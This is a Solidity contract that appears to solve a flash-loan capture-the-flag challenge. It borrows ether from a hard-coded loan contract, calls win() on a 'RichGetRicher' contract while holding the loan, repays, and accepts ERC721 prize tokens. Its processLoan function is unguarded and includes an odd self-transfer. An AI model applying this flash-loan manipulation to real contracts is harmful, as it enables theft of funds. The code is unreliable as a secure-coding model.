// SPDX-License-Identifier: MIT
pragma solidity ^0.8.2;

import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

    interface IRichGetRicher{
        function win() external payable;
    }

    interface IFlashLoanReceiver{
        function takeFlashLoan(uint256 borrowAmount) external;
    }

contract FlashLoanChallange {

    address richGetRicher = 0xF718da03a3C6E7d6BbDD5B250434BBf25bBF26E6; 
    address payable fLoan = payable(0x4CaeA92785e623BC56b011c6f141bb39f8baE94d);
    address payable thisContract = payable(address(this));

    receive() external payable{

    }

    function takeEther(uint256 borrowAmount) external payable {
        IFlashLoanReceiver(fLoan).takeFlashLoan(borrowAmount);
    }

    function processLoan(uint256 borrowAmount) external payable{
        thisContract.transfer(borrowAmount);
        IRichGetRicher(richGetRicher).win();
        fLoan.transfer(borrowAmount);
    }

    function onERC721Received(address,address,uint256,bytes memory) public virtual returns(bytes4){
        return this.onERC721Received.selector;
    }
}